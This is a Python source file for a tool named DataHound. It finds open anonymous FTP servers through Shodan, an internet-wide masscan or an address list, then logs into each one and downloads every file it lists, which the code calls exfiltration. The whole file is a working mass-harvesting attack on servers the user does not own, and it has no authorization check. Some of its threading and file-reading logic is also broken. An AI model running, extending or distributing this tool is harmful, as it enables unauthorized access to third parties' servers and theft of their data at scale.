import lib
import shodan
import codecs
import ftplib
import masscan
from os import path
from sys import path as syspath
from os.path import isdir, isfile
from configparser import ConfigParser
from concurrent.futures import ThreadPoolExecutor



# TODO (Planned Features): Bug testing, File filtering

#
# Functions
#
def manual_setup():
	while True:
		local_dir = input("Enter the local directory to exfiltrate data to: ")
		if isdir(local_dir) is True:
			break
		else:
			lib.PrintError("No such directory found, check input")
			continue
	while True:
		lib.PrintStatus("DataHound can utilize either Shodan for targeted results, scan the entire internet using Masscan, or read IP addresses from file.")
		lib.PrintStatus("Note that if you select Masscan, you must have Masscan installed on your system, due to the python-masscan library requirements.")
		search_type = input("[s]hodan, [m]asscan, or [f]ile: ")
		if search_type.lower() not in ['s', 'm', 'f']:
			lib.PrintError("Invalid Input.")
			continue
		else:
			if search_type.lower() == 's':
				shodan_key = input("Enter your shodan API key: ")
				break
			elif search_type.lower() == 'f':
				while True:
					address_file = input("Enter the filepath: ")
					if isfile(address_file) is True:
						break
					else:
						lib.PrintError("Invalid filepath, check input.")
						continue
				break
	while True:
		save_choice = input("Save configuration for repeated use? [y]/[n]: ")
		if save_choice.lower() not in ['y', 'n']:
			lib.PrintError("Invalid Input")
			continue
		else:
			if save_choice.lower() == 'n':
				break
			else:
				config_name = input("Enter the name for this configuration: ")
				with codecs.open(f'{syspath[0]}/{config_name}.ini', 'w', 'utf-8') as cfile:
					cfile.write('[vars]')
					cfile.write('\n')
					cfile.write(f'local_dir = {local_dir}')
					cfile.write('\n')
					cfile.write(f'search_type = {search_type}')
					cfile.write('\n')
					if search_type == 's':
						cfile.write(f'shodan_key = {shodan_key}')
					elif search_type == 'f':
						cfile.write(f'address_file = {address_file}')
				break
	if search_type == 's':
		ret_dict = {'local_dir': local_dir, 'search_type': search_type, 'shodan_key':shodan_key}
	elif search_type == 'f':
		ret_dict = {'local_dir':local_dir, 'search_type':search_type, 'address_file':address_file}
	else:
		ret_dict = {'local_dir': local_dir, 'search_type': search_type}
	return ret_dict
def load_config():
	parser = ConfigParser()
	while True:
		config_path = input("Enter the filepath (include .ini file extension)  to the configuration file: ")
		if isfile(config_path) is True:
			break
		else:
			lib.PrintError("Invalid Filepath, Check Input")
			continue
	parser.read(config_path, encoding='utf-8')
	local_dir = parser.get('vars', 'local_dir')
	search_type = parser.get('vars', 'search_type')
	if search_type == 's':
		shodan_key = parser.get('vars', 'shodan_key')
		ret_dict = {'local_dir': local_dir, 'search_type': search_type, 'shodan_key':shodan_key}
	elif search_type == 'f':
		address_file = parser.get('vars', 'address_file')
		ret_dict = {'local_dir':local_dir, 'search_type':search_type, 'address_file':address_file}
	else:
		ret_dict = {'local_dir': local_dir, 'search_type': search_type}
	return ret_dict
def shodan_scan(key, local_dir):
	addr_list = []
	api = shodan.Shodan(key)
	try:
		results = api.search('port:21 filter:230 login successful')
		for result in results['matches']:
			addr_list.append(result['ip_str'])
		executor = ThreadPoolExecutor(max_workers=300)
		for a in addr_list:
			executor.submit(ftp_operations(a, local_dir))
	except shodan.APIError as e:
		lib.PrintFatal(f'Fatal Error: {e}')
		exit()
def file_scan(address_file, local_dir):
	count = 0
	with open(address_file, 'r') as afile:
		for i in afile.readlines():
			count += 1
		executor = ThreadPoolExecutor(max_workers=count)
		for line in afile.readlines():
			executor.submit(ftp_operations(line, local_dir))
def masscan_scan(local_dir):
	mas = masscan.PortScanner()
	mas.scan('0.0.0.0/0', ports='21', arguments='--max-rate 1000 --exclude 255.255.255.255 --open-only')
	count = 0
	for i in mas.all_hosts():
		count += 1
	executor = ThreadPoolExecutor(max_workers=count)
	for host in mas.all_hosts():
		executor.submit(ftp_operations(host, local_dir))
def ftp_operations(host, output_location): # TODO: Find out how to check and record file sizes in relation to FTP
	if output_location.endswith('/') is False:
		output_location = output_location + '/'
	ftp_connection = ftplib.FTP(host)
	try:
		ftp_connection.login()
		lib.PrintSuccess('Login Status: 200')
		lib.PrintStatus(f'Exfiltrating files to {output_location}')
		filenames = ftp_connection.nlst()
		for filename in filenames:
			local_filename = path.join(output_location, filename)
			file = open(local_filename, 'wb')
			ftp_connection.retrbinary('RETR ' + filename, file.write)

	except Exception as e:
		lib.PrintError(f'{e}')
def main():
	lib.PrintTitle()
	while True:
		conf = input("[L]oad configuration file or do [m]anual setup: ")
		if conf not in ['l', 'm']:
			lib.PrintError("Invalid Input")
			continue
		elif conf.lower() == 'l':
			vars_dict = load_config()
			if vars_dict['search_type'] == 's':
				shodan_scan(vars_dict['shodan_key'], vars_dict['local_dir'])
				lib.PrintSuccess("Scan Complete")
				break
			elif vars_dict['search_type'] == 'f':
				file_scan(vars_dict['address_file'], vars_dict['local_dir'])
				lib.PrintSuccess("Scan Complete")
				break
			else:
				masscan_scan(vars_dict['local_dir'])
				lib.PrintSuccess("Scan Complete")
				break
		else:
			vars_dict = manual_setup()
			if vars_dict['search_type'] == 's':
				shodan_scan(vars_dict['shodan_key'], vars_dict['local_dir'])
				lib.PrintSuccess("Scan Complete")
				break
			elif vars_dict['search_type'] == 'f':
				file_scan(vars_dict['address_file'], vars_dict['local_dir'])
				lib.PrintSuccess("Scan Complete")
				break
			else:
				masscan_scan(vars_dict['local_dir'])
				lib.PrintSuccess("Scan Complete")
				break
#
# Main
#
if __name__ == '__main__':
	main()
